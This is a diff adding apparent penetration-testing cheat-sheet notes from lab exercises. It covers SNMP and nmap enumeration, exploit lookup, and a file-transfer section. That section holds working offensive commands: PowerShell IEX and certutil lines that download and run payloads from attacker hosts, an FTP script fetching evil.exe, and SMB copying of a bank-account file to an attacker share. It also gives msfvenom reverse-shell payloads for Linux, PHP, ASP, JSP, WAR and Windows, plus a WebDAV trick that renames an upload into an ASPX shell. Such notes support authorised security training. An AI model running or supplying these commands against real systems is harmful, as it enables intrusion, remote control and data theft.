@@ -1,0 +1,130 @@
+4.5.2 - Scanning for SNMP
+  root@kali:~# nmap -sU --open -p 161 10.xx.1.1-254 -oG mega-snmp.txt
+4.5.3 - Windows SNMP Enumeration Example
+  Enumerating the Entire MIB Tree
+  root@kali:~# snmpwalk -c public -v1 10.xx.1.xx
+    iso.3.6.1.2.1.1.1.0 = STRING: "Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP "
+  Enumerating Windows Users:
+  root@kali:~# snmpwalk –c public –v1 10.xx.1.xx 1.3.6.1.4.1.77.1.2.25
+  Enumerating Running Windows Processes:
+  root@kali:~# snmpwalk -c public -v1 10.xx.1.xx 1.3.6.1.2.1.25.4.2.1.2
+  Enumerating Open TCP Ports:
+  snmpwalk -c public -v1 10.xx.1.xx 1.3.6.1.2.1.6.13.1.3
+  Enumerating Installed Software:
+  root@kali:~# snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
+5.1 - Vulnerability Scanning with Nmap
+  root@kali:~# cd /usr/share/nmap/scripts/
+  root@kali:/usr/share/nmap/scripts# ls -l *vuln*
+          -rw-r--r-- 1 root root 6960 Dec 13 2012 afp-path-vuln.nse
+          -rw-r--r-- 1 root root 6190 Dec 13 2012 ftp-vuln-cve2010-4221.nse
+          -rw-r--r-- 1 root root 7112 Dec 13 2012 http-huawei-hg5xx-vuln.nse
+          
+  root@kali:~# nmap -v -p 80 --script=http-vuln-cve2010-2861 10.xx.1.xx
+          Starting Nmap 6.25 ( http://nmap.org ) at 2013-06-17 10:28 MDT
+          NSE: Loaded 1 scripts for scanning.
+          NSE: Script Pre-scanning.
+          Initiating Ping Scan at 10:28
+          Scanning 10.xx.xx.xx [4 ports]
+          80/tcp open http
+          | http-vuln-cve2010-2861:
+          | VULNERABLE:
+          | Adobe ColdFusion Directory Traversal Vulnerability
+          | State: VULNERABLE (Exploitable)
+          | IDs: OSVDB:67047 CVE:CVE-2010-2861
+          | Description:
+          | Multiple directory traversal vulnerabilities in the administrator console
+          | in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read
+          arbitrary files via the
+  root@kali:~# nmap -v -p 21 --script=ftp-anon.nse 10.xx.1.1-254
+            ...
+            Nmap scan report for 10.xx.1.xx
+            Host is up (0.19s latency).
+            PORT STATE SERVICE
+            21/tcp open ftp
+            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+            | total 20
+9.1.1 - Finding Exploits in Kali Linux
+  root@kali:~# searchsploit slmail
+            Description Path
+            -------------------------------------------------- -------------------------
+            SLMail 5.5 POP3 PASS Buffer Overflow Exploit /windows/remote/638.py
+9.2 - Customizing and Fixing Exploits
+10. - File Transfers
+
+=========FTP============
+
+/etc/init.d/pure-ftpd restart
+
+# On Windows
+echo open <attackerip> 21> ftp.txt
+echo USER username password >> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+============Powershell==========
+
+python -m SimpleHTTPServer 80
+--------------------------------------
+
+Powershell
+echo $webclient = New-Object System.Net.WebClient >wget.ps1
+echo $url = "http://10.10.14.xx/Chimichurri.exe" >>wget.ps1
+echo $file = "Chimichurri.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInterative -NoProfile -File wget.ps1
+--------------------------------------
+# Powershell download a file
+powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+
+powershell.exe (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
+
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http:///<script>')"
+  
+powershell full path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe
+======Certutil.exe====
+certutil.exe -urlcache -split -f "http://10.10.14.40/MS10-059.exe" bad.exe
+  
+====SMB Server=========
+To start SMB server:
+python /opt/impacket/examples/smbserver.py ROPNOP /root/
+
+To put/get files:
+copy \\10.11.0.105\ROPNOP\nc.exe .
+copy C:\bank-account.zip \\10.11.0.105\ROPNOP\
+
+Msfvenom
+#Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 -f elf > shell.elf
+# PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.php
+# ASP
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.206 LPORT=9009 -f asp > shell.asp
+# WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f war > shell.war
+# JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > shell.jsp
+# Exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.206 LPORT=9009 -f exe -o reverse.exe
+msfvenom -p php/reverse_php LHOST=192.168.XX.XX LPORT=4444-f raw > sploit.php
+==CURL===
+curl -i http://10.10.10.15/
+-i, --include       Include protocol response headers in the output
+
+curl is used once again to move the file from txt to aspx:
+curl -X MOVE --header "Destination:http://10.10.10.15/shell.aspx" http://10.10.10.15/shell.txt
+  
+11.DNS :If DNS port is open then try to dig for zone records
+#dnsrecon -r 10.10.10.0/24 -n 10.10.10.13
+# dig axfr @10.10.10.13 cronos.htb
+
+or 
+
+We have used command  to check the DNS running on this IP. On the other hand, it gave us a clue for our next step which is another Domain
+
+# host -l cronos.htb 10.10.10.13
+
+/opt$ find / -iname "ccc" 2>/dev/null
+
+
+
